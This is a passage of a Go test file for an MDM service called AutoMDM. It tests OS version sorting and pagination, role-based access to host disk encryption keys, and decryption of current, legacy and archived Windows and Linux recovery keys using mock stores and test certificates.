	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	// Mixes dot-separated numeric versions with differing digit counts, a
	// Windows feature-update codename, and a non-numeric version (Arch
	// Linux's "rolling") to exercise every branch of compareOSVersions.
	// IDs 4, 8, and 9 share the "22H1" version across different editions
	// (a realistic tie: distinct NameOnly values, since the datastore
	// already aggregates same NameOnly+Version rows into one), to exercise
	// the OSVersionID tie-breaker.
	//
	// Windows has the most hosts overall (3000) despite its version
	// strings comparing "lower" than macOS's ("22H1"/"21H2"/"10.x" vs.
	// "26.x") — this deliberately makes flat version comparison and
	// grouped-by-platform comparison disagree on group order, so the
	// assertions below only pass if the platform grouping is actually
	// driving the primary sort, not just incidentally matching it.
	testVersions := []automdm.OSVersion{
		{OSVersionID: 1, NameOnly: "Windows 11 Pro", Platform: "windows", Version: "10.0.9200.100", HostsCount: 500},
		{OSVersionID: 2, NameOnly: "Windows 11 Pro", Platform: "windows", Version: "10.0.26200.8875", HostsCount: 500},
		{OSVersionID: 3, NameOnly: "Windows 10 Pro", Platform: "windows", Version: "21H2", HostsCount: 500},
		{OSVersionID: 4, NameOnly: "Windows 10 Pro", Platform: "windows", Version: "22H1", HostsCount: 500},
		{OSVersionID: 5, NameOnly: "macOS", Platform: "darwin", Version: "26.6", HostsCount: 100},
		{OSVersionID: 6, NameOnly: "macOS", Platform: "darwin", Version: "26.10", HostsCount: 100},
		{OSVersionID: 7, NameOnly: "Arch Linux", Platform: "arch", Version: "rolling", HostsCount: 10},
		{OSVersionID: 8, NameOnly: "Windows 10 Enterprise", Platform: "windows", Version: "22H1", HostsCount: 500},
		{OSVersionID: 9, NameOnly: "Windows 10 Education", Platform: "windows", Version: "22H1", HostsCount: 500},
	}
	// Platform totals: windows 3000, darwin 200, arch 10.

	now := time.Now()

	ds.OSVersionsFunc = func(
		ctx context.Context, teamFilter *automdm.TeamFilter, platform *string, name *string, version *string,
	) (*automdm.OSVersions, error) {
		return &automdm.OSVersions{CountsUpdatedAt: now, OSVersions: testVersions}, nil
	}

	ds.ListVulnsByMultipleOSVersionsFunc = func(ctx context.Context, osVersions []automdm.OSVersion, includeCVSS bool,
		teamID *uint, maxVulnerabilities *int,
	) (map[string]automdm.OSVulnerabilitiesWithCount, error) {
		return nil, nil
	}

	// Platform groups always order by host total descending (windows,
	// then darwin, then arch), regardless of the version sort direction.
	// Within each group: descending version sort puts latest first —
	// "10.0.26200.8875" above "10.0.9200.100" (not a string comparison,
	// which would get this backwards), "22H1" above "21H2", "26.10" above
	// "26.6"; the "22H1" tie (IDs 4, 8, 9) breaks by OSVersionID ascending
	// regardless of the primary sort direction. Ascending only reverses
	// the within-group version order, not the group order itself.
	wantDescending := []uint{4, 8, 9, 3, 2, 1, 6, 5, 7}
	wantAscending := []uint{1, 2, 3, 4, 8, 9, 5, 6, 7}

	opts := automdm.ListOptions{OrderKey: "os_version", OrderDirection: automdm.OrderDescending}
	vers, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	require.Len(t, vers.OSVersions, len(wantDescending))
	for i, wantID := range wantDescending {
		assert.Equal(t, wantID, vers.OSVersions[i].OSVersionID, "descending index %d", i)
	}

	// ascending version sort: reverse order, but the tied trio keeps the
	// same relative (OSVersionID-ascending) order as in the descending case.
	opts = automdm.ListOptions{OrderKey: "os_version", OrderDirection: automdm.OrderAscending}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	require.Len(t, vers.OSVersions, len(wantAscending))
	for i, wantID := range wantAscending {
		assert.Equal(t, wantID, vers.OSVersions[i].OSVersionID, "ascending index %d", i)
	}

	// pagination + descending version sort stays deterministic across
	// pages, including page 1, which straddles the windows/darwin platform
	// group boundary (windows IDs 2, 1 followed by darwin IDs 6, 5).
	opts = automdm.ListOptions{Page: 0, PerPage: 4, OrderKey: "os_version", OrderDirection: automdm.OrderDescending}
	page0, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	require.Len(t, page0.OSVersions, 4)

	opts = automdm.ListOptions{Page: 1, PerPage: 4, OrderKey: "os_version", OrderDirection: automdm.OrderDescending}
	page1, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	require.Len(t, page1.OSVersions, 4)

	opts = automdm.ListOptions{Page: 2, PerPage: 4, OrderKey: "os_version", OrderDirection: automdm.OrderDescending}
	page2, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	require.Len(t, page2.OSVersions, 1)

	gotPaged := make([]uint, 0, len(wantDescending))
	for _, page := range []*automdm.OSVersions{page0, page1, page2} {
		for _, v := range page.OSVersions {
			gotPaged = append(gotPaged, v.OSVersionID)
		}
	}
	assert.Equal(t, wantDescending, gotPaged, "paginated results must match the unpaginated descending order")

	// invalid order key
	opts = automdm.ListOptions{OrderKey: "nameonly"}
	_, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.Error(t, err)
}

func TestCompareOSVersions(t *testing.T) {
	cases := []struct {
		name     string
		a, b     string
		expected int
	}{
		{"equal numeric", "26.6", "26.6", 0},
		{"multi-digit segment, not a string comparison", "26.6", "26.10", -1},
		{"longer numeric version is newer", "26.5", "26.5.1", -1},
		{"differing segment counts, four segments", "10.0.9200.100", "10.0.26200.8875", -1},
		{"windows codename, same year", "21H1", "21H2", -1},
		{"windows codename, different year", "21H2", "22H1", -1},
		{"windows codename equal", "22H1", "22H1", 0},
		{"non-numeric sorts before numeric", "rolling", "26.6", -1},
		{"numeric sorts after non-numeric", "26.6", "rolling", 1},
		{"two non-numeric versions are equal", "rolling", "rolling", 0},
		{"empty string sorts before numeric", "", "26.6", -1},
		// Segments beyond what strconv.Atoi can hold must still order
		// correctly instead of overflowing/tying (see versionSegments).
		{"segment one past int64 max orders correctly", "9223372036854775807", "9223372036854775808", -1},
		{"arbitrarily large segment orders by significant digits", "31415926535897932384626", "9223372036854775808", 1},
		{"leading zeros don't inflate significant digit count", "007", "12", -1},
		{"all-zero segments of differing width are equal", "000", "0", 0},
		// osquery's os_version table reports Ubuntu LTS releases with a
		// literal " LTS" suffix (e.g. "22.04.9 LTS"), which AutoMDM stores
		// verbatim (see versionSegments). Without stripping it, these tie
		// as non-comparable instead of comparing numerically.
		{"ubuntu LTS suffix is stripped before numeric comparison", "22.04.9 LTS", "22.04.15 LTS", -1},
		{"ubuntu LTS suffix is case-insensitive", "22.04.9 lts", "22.04.15 LTS", -1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			assert.Equal(t, c.expected, compareOSVersions(c.a, c.b), c.name)
			assert.Equal(t, -c.expected, compareOSVersions(c.b, c.a), c.name+" (reversed)")
		})
	}
}

func TestOSVersionsDefaultPagination(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	testVersions := []automdm.OSVersion{}
	for i := range 50 {
		testVersions = append(testVersions, automdm.OSVersion{NameOnly: fmt.Sprintf("Version %02d", i), HostsCount: i, Platform: "windows"})
	}

	ds.OSVersionsFunc = func(
		ctx context.Context, teamFilter *automdm.TeamFilter, platform *string, name *string, version *string,
	) (*automdm.OSVersions, error) {
		return &automdm.OSVersions{CountsUpdatedAt: time.Now(), OSVersions: testVersions}, nil
	}

	ds.ListVulnsByMultipleOSVersionsFunc = func(ctx context.Context, osVersions []automdm.OSVersion, includeCVSS bool,
		teamID *uint, maxVulnerabilities *int,
	) (map[string]automdm.OSVulnerabilitiesWithCount, error) {
		return nil, nil
	}

	// test default descending count sort + default pagination (page 0, per_page 20)
	opts := automdm.ListOptions{}
	vers, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 20)
	assert.Equal(t, "Version 49", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "Version 30", vers.OSVersions[19].NameOnly)
}

func TestHostEncryptionKey(t *testing.T) {
	cases := []struct {
		name            string
		host            *automdm.Host
		allowedUsers    []*automdm.User
		disallowedUsers []*automdm.User
	}{
		{
			name: "global host",
			host: &automdm.Host{
				ID:       1,
				Platform: "darwin",
				NodeKey:  new("test_key"),
				Hostname: "test_hostname",
				UUID:     "test_uuid",
				TeamID:   nil,
			},
			allowedUsers: []*automdm.User{
				test.UserAdmin,
				test.UserMaintainer,
				test.UserObserver,
				test.UserObserverPlus,
			},
			disallowedUsers: []*automdm.User{
				test.UserTeamAdminTeam1,
				test.UserTeamMaintainerTeam1,
				test.UserTeamObserverTeam1,
				test.UserNoRoles,
			},
		},
		{
			name: "team host",
			host: &automdm.Host{
				ID:       2,
				Platform: "darwin",
				NodeKey:  new("test_key_2"),
				Hostname: "test_hostname_2",
				UUID:     "test_uuid_2",
				TeamID:   new(uint(1)),
			},
			allowedUsers: []*automdm.User{
				test.UserAdmin,
				test.UserMaintainer,
				test.UserObserver,
				test.UserObserverPlus,
				test.UserTeamAdminTeam1,
				test.UserTeamMaintainerTeam1,
				test.UserTeamObserverTeam1,
				test.UserTeamObserverPlusTeam1,
			},
			disallowedUsers: []*automdm.User{
				test.UserTeamAdminTeam2,
				test.UserTeamMaintainerTeam2,
				test.UserTeamObserverTeam2,
				test.UserTeamObserverPlusTeam2,
				test.UserNoRoles,
			},
		},
	}

	testCert, testKey, err := apple_mdm.NewSCEPCACertKey()
	require.NoError(t, err)
	testCertPEM := tokenpki.PEMCertificate(testCert.Raw)
	testKeyPEM := tokenpki.PEMRSAPrivateKey(testKey)

	automdmCfg := config.TestConfig()
	config.SetTestMDMConfig(t, &automdmCfg, testCertPEM, testKeyPEM, "")

	recoveryKey := "AAA-BBB-CCC"
	encryptedKey, err := pkcs7.Encrypt([]byte(recoveryKey), []*x509.Certificate{testCert})
	require.NoError(t, err)
	base64EncryptedKey := base64.StdEncoding.EncodeToString(encryptedKey)

	wstep, _, _, err := automdmCfg.MDM.MicrosoftWSTEP()
	require.NoError(t, err)
	winEncryptedKey, err := pkcs7.Encrypt([]byte(recoveryKey), []*x509.Certificate{wstep.Leaf})
	require.NoError(t, err)
	winBase64EncryptedKey := base64.StdEncoding.EncodeToString(winEncryptedKey)

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			ds := new(mock.Store)
			ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
				return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
			}
			opts := &TestServerOpts{}
			svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil, opts)

			ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
				require.Equal(t, tt.host.ID, id)
				return tt.host, nil
			}

			ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{
					Base64Encrypted: base64EncryptedKey,
					Decryptable:     new(true),
				}, nil
			}
			ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
				return &automdm.HostArchivedDiskEncryptionKey{}, nil
			}

			opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, activity activity_api.ActivityDetails) error {
				act := activity.(automdm.ActivityTypeReadHostDiskEncryptionKey)
				require.Equal(t, tt.host.ID, act.HostID)
				require.Equal(t, []uint{tt.host.ID}, act.HostIDs())
				require.EqualValues(t, act.HostDisplayName, tt.host.DisplayName())
				return nil
			}

			ds.GetAllMDMConfigAssetsByNameFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName,
				_ sqlx.QueryerContext,
			) (map[automdm.MDMAssetName]automdm.MDMConfigAsset, error) {
				return map[automdm.MDMAssetName]automdm.MDMConfigAsset{
					automdm.MDMAssetCACert: {Name: automdm.MDMAssetCACert, Value: testCertPEM},
					automdm.MDMAssetCAKey:  {Name: automdm.MDMAssetCAKey, Value: testKeyPEM},
				}, nil
			}
			ds.GetAllMDMConfigAssetsByNameIncludingDeletedFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName) ([]automdm.MDMConfigAsset, error) {
				return []automdm.MDMConfigAsset{{Name: automdm.MDMAssetCACert, Value: testCertPEM}}, nil
			}

			t.Run("allowed users", func(t *testing.T) {
				for _, u := range tt.allowedUsers {
					_, err := svc.HostEncryptionKey(test.UserContext(ctx, u), tt.host.ID, false)
					require.NoError(t, err)
				}
			})

			t.Run("disallowed users", func(t *testing.T) {
				for _, u := range tt.disallowedUsers {
					_, err := svc.HostEncryptionKey(test.UserContext(ctx, u), tt.host.ID, false)
					require.Error(t, err)
					require.Contains(t, authz.ForbiddenErrorMessage, err.Error())
				}
			})

			t.Run("no user in context", func(t *testing.T) {
				_, err := svc.HostEncryptionKey(ctx, tt.host.ID, false)
				require.Error(t, err)
				require.Contains(t, authz.ForbiddenErrorMessage, err.Error())
			})
		})
	}

	t.Run("test error cases", func(t *testing.T) {
		ds := new(mock.Store)
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
		}
		opts := &TestServerOpts{}
		svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil, opts)
		ctx = test.UserContext(ctx, test.UserAdmin)

		hostErr := errors.New("host error")
		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return nil, hostErr
		}
		_, err := svc.HostEncryptionKey(ctx, 1, false)
		require.ErrorIs(t, err, hostErr)
		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{}, nil
		}

		keyErr := errors.New("key error")
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return nil, keyErr
		}
		ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
			return &automdm.HostArchivedDiskEncryptionKey{}, nil
		}
		ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
			return &automdm.HostArchivedDiskEncryptionKey{}, nil
		}
		ds.GetAllMDMConfigAssetsByNameFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName,
			_ sqlx.QueryerContext,
		) (map[automdm.MDMAssetName]automdm.MDMConfigAsset, error) {
			return map[automdm.MDMAssetName]automdm.MDMConfigAsset{
				automdm.MDMAssetCACert: {Name: automdm.MDMAssetCACert, Value: testCertPEM},
				automdm.MDMAssetCAKey:  {Name: automdm.MDMAssetCAKey, Value: testKeyPEM},
			}, nil
		}
		ds.GetAllMDMConfigAssetsByNameIncludingDeletedFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName) ([]automdm.MDMConfigAsset, error) {
			return []automdm.MDMConfigAsset{{Name: automdm.MDMAssetCACert, Value: testCertPEM}}, nil
		}
		_, err = svc.HostEncryptionKey(ctx, 1, false)
		require.ErrorIs(t, err, keyErr)
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return &automdm.HostDiskEncryptionKey{Base64Encrypted: "key"}, nil
		}

		opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, _ activity_api.ActivityDetails) error {
			return errors.New("activity error")
		}

		_, err = svc.HostEncryptionKey(ctx, 1, false)
		require.Error(t, err)
	})

	t.Run("host platform mdm enabled", func(t *testing.T) {
		// A Windows key depends on the server private key only, so it is readable whether or not Windows MDM is on.
		cases := []struct {
			hostPlatform  string
			macMDMEnabled bool
			winMDMEnabled bool
			shouldFail    bool
		}{
			{"windows", true, false, false},
			{"windows", false, true, false},
			{"windows", true, true, false},
			{"darwin", true, false, false},
			{"darwin", false, true, true},
			{"darwin", true, true, false},
		}
		for _, c := range cases {
			t.Run(fmt.Sprintf("%s: mac mdm: %t; win mdm: %t", c.hostPlatform, c.macMDMEnabled, c.winMDMEnabled), func(t *testing.T) {
				ds := new(mock.Store)
				ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
					return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: c.macMDMEnabled, WindowsEnabledAndConfigured: c.winMDMEnabled}}, nil
				}
				ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
					return &automdm.Host{Platform: c.hostPlatform}, nil
				}
				ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
					key := base64EncryptedKey
					if c.hostPlatform == "windows" {
						key = winBase64EncryptedKey
					}
					return &automdm.HostDiskEncryptionKey{
						Base64Encrypted: key,
						Decryptable:     new(true),
						WSTEPEncrypted:  c.hostPlatform == "windows",
					}, nil
				}
				ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
					return &automdm.HostArchivedDiskEncryptionKey{}, nil
				}
				ds.GetAllMDMConfigAssetsByNameFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName,
					_ sqlx.QueryerContext,
				) (map[automdm.MDMAssetName]automdm.MDMConfigAsset, error) {
					return map[automdm.MDMAssetName]automdm.MDMConfigAsset{
						automdm.MDMAssetCACert: {Name: automdm.MDMAssetCACert, Value: testCertPEM},
						automdm.MDMAssetCAKey:  {Name: automdm.MDMAssetCAKey, Value: testKeyPEM},
					}, nil
				}
				ds.GetAllMDMConfigAssetsByNameIncludingDeletedFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName) ([]automdm.MDMConfigAsset, error) {
					return []automdm.MDMConfigAsset{{Name: automdm.MDMAssetCACert, Value: testCertPEM}}, nil
				}

				svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
				ctx = test.UserContext(ctx, test.UserAdmin)
				_, err := svc.HostEncryptionKey(ctx, 1, false)
				if c.shouldFail {
					require.ErrorContains(t, err, automdm.ErrMDMNotConfigured.Error())
				} else {
					require.NoError(t, err)
				}
			})
		}
	})

	t.Run("Windows keys", func(t *testing.T) {
		aesKey, err := mdm.EncryptAndEncode(recoveryKey, automdmCfg.Server.PrivateKey)
		require.NoError(t, err)
		// A key escrowed by an older release names the WSTEP certificate of that time. The configured one here has the same key
		// and a different serial, which is what a renewal looks like.
		renewed := selfSignedCertForKey(t, wstep.PrivateKey.(*rsa.PrivateKey), 42)
		legacyKey, err := pkcs7.Encrypt([]byte(recoveryKey), []*x509.Certificate{renewed})
		require.NoError(t, err)
		legacyB64 := base64.StdEncoding.EncodeToString(legacyKey)
		// Encrypted to a certificate whose key the server never had, as after replacing the WSTEP pair.
		otherKey, err := rsa.GenerateKey(rand.Reader, 2048)
		require.NoError(t, err)
		deadKey, err := pkcs7.Encrypt([]byte(recoveryKey), []*x509.Certificate{selfSignedCertForKey(t, otherKey, 43)})
		require.NoError(t, err)
		deadB64 := base64.StdEncoding.EncodeToString(deadKey)

		cases := []struct {
			name       string
			current    *automdm.HostDiskEncryptionKey
			archived   *automdm.HostArchivedDiskEncryptionKey
			want       string
			wantErr    string
			noReescrow string // why nothing asks the host for a new key, if anything
		}{
			{"server private key", &automdm.HostDiskEncryptionKey{Base64Encrypted: aesKey, Decryptable: new(true)}, nil, recoveryKey, "", ""},
			{"legacy key with a renewed certificate", &automdm.HostDiskEncryptionKey{Base64Encrypted: legacyB64, WSTEPEncrypted: true, Decryptable: new(true)}, nil, recoveryKey, "", ""},
			{"legacy key on an unmarked row, since reads do not depend on the marker", &automdm.HostDiskEncryptionKey{Base64Encrypted: legacyB64, Decryptable: new(true)}, nil, recoveryKey, "", ""},
			{"server-key blob on a marked row", &automdm.HostDiskEncryptionKey{Base64Encrypted: aesKey, WSTEPEncrypted: true, Decryptable: new(true)}, nil, recoveryKey, "", ""},
			{"unreadable key on an unmarked row", &automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, Decryptable: new(true)}, nil, "", "Couldn't decrypt the disk encryption key.", ""},
			{"legacy key after the pair was replaced, before the job marked it", &automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, WSTEPEncrypted: true, Decryptable: new(true)}, nil, "", "Couldn't decrypt the disk encryption key.", ""},
			{"legacy key after the pair was replaced, marked by the job", &automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, WSTEPEncrypted: true, Decryptable: new(false)}, nil, "", "The host will escrow a new one", ""},
			// Marked, but nothing will ask the host for a new key, so the error must not promise one.
			{"marked key in a team without Windows disk encryption", &automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, WSTEPEncrypted: true, Decryptable: new(false)}, nil, "", "Couldn't decrypt the disk encryption key.", "automdm"},
			{"marked key while Windows MDM is off", &automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, Decryptable: new(false)}, nil, "", "Couldn't decrypt the disk encryption key.", "windows mdm"},
			{"marked key on a host not enrolled in AutoMDM", &automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, Decryptable: new(false)}, nil, "", "Couldn't decrypt the disk encryption key.", "not enrolled"},
			{
				"archived legacy key when the current one is unreadable",
				&automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, WSTEPEncrypted: true},
				&automdm.HostArchivedDiskEncryptionKey{Base64Encrypted: legacyB64, WSTEPEncrypted: true}, recoveryKey, "", "",
			},
			{
				"archived key on the server private key",
				&automdm.HostDiskEncryptionKey{Base64Encrypted: deadB64, WSTEPEncrypted: true},
				&automdm.HostArchivedDiskEncryptionKey{Base64Encrypted: aesKey}, recoveryKey, "", "",
			},
		}
		for _, c := range cases {
			t.Run(c.name, func(t *testing.T) {
				ds := new(mock.Store)
				ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
					return &automdm.AppConfig{MDM: automdm.MDM{WindowsEnabledAndConfigured: c.noReescrow != "windows mdm"}}, nil
				}
				ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
					return c.noReescrow != "not enrolled", nil
				}
				ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
					return &automdm.Host{ID: 1, Platform: "windows"}, nil
				}
				ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
					return c.current, nil
				}
				ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
					if c.archived == nil {
						return nil, newNotFoundError()
					}
					return c.archived, nil
				}
				ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
					return automdm.DiskEncryptionConfig{WindowsEnabled: c.noReescrow != "automdm"}, nil
				}
				svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
				ctx = test.UserContext(ctx, test.UserAdmin)
				key, err := svc.HostEncryptionKey(ctx, 1, false)
				if c.wantErr != "" {
					var ume *automdm.UserMessageError
					require.ErrorAs(t, err, &ume)
					require.ErrorContains(t, err, c.wantErr)
					require.NotContains(t, err.Error(), "MDM has been turned off")
					if (c.current.Decryptable != nil && *c.current.Decryptable) || c.noReescrow != "" {
						require.NotContains(t, err.Error(), "escrow a new one", "no re-escrow is coming for this host")
					}
					return
				}
				require.NoError(t, err)
				require.Equal(t, c.want, key.DecryptedValue)
			})
		}
	})

	// Older releases encrypted Windows keys to the WSTEP certificate only, so a deployment without a server private key
	// must still read the keys it already has.
	t.Run("Windows keys without a server private key", func(t *testing.T) {
		legacyKey, err := pkcs7.Encrypt([]byte(recoveryKey), []*x509.Certificate{wstep.Leaf})
		require.NoError(t, err)
		legacyB64 := base64.StdEncoding.EncodeToString(legacyKey)
		withWSTEP := automdmCfg
		withWSTEP.Server.PrivateKey = ""
		neither := config.TestConfig()
		neither.Server.PrivateKey = ""

		for _, c := range []struct {
			name    string
			cfg     config.AutoMDMConfig
			want    string
			wantErr string
		}{
			{"legacy key reads with the WSTEP pair", withWSTEP, recoveryKey, ""},
			{"no private key and no WSTEP pair", neither, "", "private key is unavailable"},
		} {
			t.Run(c.name, func(t *testing.T) {
				ds := new(mock.Store)
				ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
					return &automdm.AppConfig{}, nil
				}
				ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
					return &automdm.Host{ID: 1, Platform: "windows"}, nil
				}
				ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
					return &automdm.HostDiskEncryptionKey{Base64Encrypted: legacyB64, WSTEPEncrypted: true, Decryptable: new(true)}, nil
				}
				ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
					return nil, newNotFoundError()
				}
				svc, ctx := newTestServiceWithConfig(t, ds, c.cfg, nil, nil)
				ctx = test.UserContext(ctx, test.UserAdmin)
				key, err := svc.HostEncryptionKey(ctx, 1, false)
				if c.wantErr != "" {
					require.ErrorContains(t, err, c.wantErr)
					return
				}
				require.NoError(t, err)
				require.Equal(t, c.want, key.DecryptedValue)
			})
		}
	})

	t.Run("Linux encryption", func(t *testing.T) {
		ds := new(mock.Store)
		host := &automdm.Host{ID: 1, Platform: "ubuntu"}
		symmetricKey := "this_is_a_32_byte_symmetric_key!"
		passphrase := "this_is_a_passphrase"
		base64EncryptedKey, err := mdm.EncryptAndEncode(passphrase, symmetricKey)
		require.NoError(t, err)
		base64ArchivedKey, err := mdm.EncryptAndEncode("previous_passphrase", symmetricKey)
		require.NoError(t, err)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return host, nil
		}
		// A decryptable archived key is always present: Linux must never fall back to it.
		ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
			return &automdm.HostArchivedDiskEncryptionKey{Base64Encrypted: base64ArchivedKey}, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) { // needed for new activity
			return &automdm.AppConfig{}, nil
		}

		// error when no server private key
		automdmCfg.Server.PrivateKey = ""
		svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
		ctx = test.UserContext(ctx, test.UserAdmin)
		key, err := svc.HostEncryptionKey(ctx, 1, false)
		require.Error(t, err, "private key is unavailable")
		require.Nil(t, key)

		// not found when the verify query deleted the key
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return nil, newNotFoundError()
		}
		automdmCfg.Server.PrivateKey = symmetricKey
		svc, ctx = newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
		ctx = test.UserContext(ctx, test.UserAdmin)
		key, err = svc.HostEncryptionKey(ctx, 1, false)
		require.True(t, automdm.IsNotFound(err), "expected not found, got: %v", err)
		require.Nil(t, key)

		// not found when a new escrow is queued but the key hasn't arrived yet
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return &automdm.HostDiskEncryptionKey{}, nil
		}
		svc, ctx = newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
		ctx = test.UserContext(ctx, test.UserAdmin)
		key, err = svc.HostEncryptionKey(ctx, 1, false)
		require.True(t, automdm.IsNotFound(err), "expected not found, got: %v", err)
		require.Nil(t, key)

		// error when key is not set
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return &automdm.HostDiskEncryptionKey{
				Base64Encrypted: "thisIsWrong",
				Decryptable:     new(true),
			}, nil
		}
		svc, ctx = newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
		ctx = test.UserContext(ctx, test.UserAdmin)
		key, err = svc.HostEncryptionKey(ctx, 1, false)
		require.Error(t, err, "decrypt host encryption key")
		require.Nil(t, key)

		// happy path
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return &automdm.HostDiskEncryptionKey{
				Base64Encrypted: base64EncryptedKey,
				Decryptable:     new(true),
			}, nil
		}
		svc, ctx = newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
		ctx = test.UserContext(ctx, test.UserAdmin)
		key, err = svc.HostEncryptionKey(ctx, 1, false)
		require.NoError(t, err)
		require.Equal(t, passphrase, key.DecryptedValue)
	})

	t.Run("decryption failure returns user message error", func(t *testing.T) {
		ds := new(mock.Store)
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
		}
		svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
		ctx = test.UserContext(ctx, test.UserAdmin)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, Platform: "darwin"}, nil
		}

		// Return a key encrypted with a different certificate (i.e., simulate rotated certs)
